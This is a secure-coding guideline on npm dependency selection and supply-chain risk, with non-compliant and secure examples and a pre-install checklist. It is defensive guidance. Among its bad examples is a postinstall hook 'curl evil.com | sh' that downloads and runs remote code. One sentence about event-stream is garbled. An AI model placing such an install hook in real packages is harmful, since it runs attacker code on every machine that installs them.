---
title: Prefer Narrow, Well-Maintained Packages with Minimal Footprint
impact: MEDIUM-HIGH
impactDescription: CWE-1104 — OWASP A06 Non-compliant and Outdated Components
tags: security, dependencies, supply-chain, package-selection, minimalism
---

## Prefer Narrow, Well-Maintained Packages with Minimal Footprint

**Impact: MEDIUM-HIGH — CWE-1104**

Each dependency you add transitively introduces dozens more packages, each a potential risk vector. Packages with wide permissions (filesystem, network, shell access), low maintenance activity, or a single maintainer are high-risk. Evaluate packages before adding them.

**Non-compliant (unnecessary broad dependencies):**

```bash
# ❌ Installing lodash for one utility function
npm install lodash         # 100+ functions — adds 70kB to bundle

# ❌ Package with excessive permissions
# package.json (untrusted package)
# "scripts": { "postinstall": "curl evil.com | sh" }

# ❌ Using a package with known issues and no recent maintenance
npm install left-pad       # famous example of fragile supply chain
npm install event-stream   # was unauthorized accessd in 2018 to steal Bitcoin
```

**Secure (minimal, audited dependencies):**

```bash
# ✅ Use native alternatives before adding a package
# Instead of lodash.get:
const value = obj?.deeply?.nested?.value ?? defaultValue

# Instead of axios (for simple requests):
const res = await fetch('https://api.example.com/data')
const data = await res.json()

# Instead of moment.js (heavy, unmaintained):
# Use date-fns (tree-shakeable) or Temporal API

# ✅ Evaluate a package before installing
npx package-phobia [package-name]  # check install size
npx is-esm [package-name]          # check ESM support
```

```typescript
// ✅ Checklist before adding a dependency:
// 1. Weekly downloads > 100k? (wide usage = more eyes on code)
// 2. Last publish < 6 months for active, or < 2 years for stable utilities?
// 3. GitHub stars > 500? Open issues triaged?
// 4. Only one maintainer? (high risk — consider forking critical utilities)
// 5. postinstall script present? (review carefully — common malware vector)
// 6. Does it request unusual permissions (child_process, eval, network)?

// ✅ Audit postinstall scripts across all deps
npx can-i-ignore-scripts  // check which postinstall scripts exist
npm install --ignore-scripts  // disable postinstall (may break some packages)
```

Regularly run `npm ls --depth=0` to audit direct dependencies. Remove packages you no longer use. Isolate high-risk dependencies (image processing, PDF generation) in separate services.

Reference: [OWASP Software Component Verification Standard](https://owasp.org/www-project-software-component-verification-standard/)
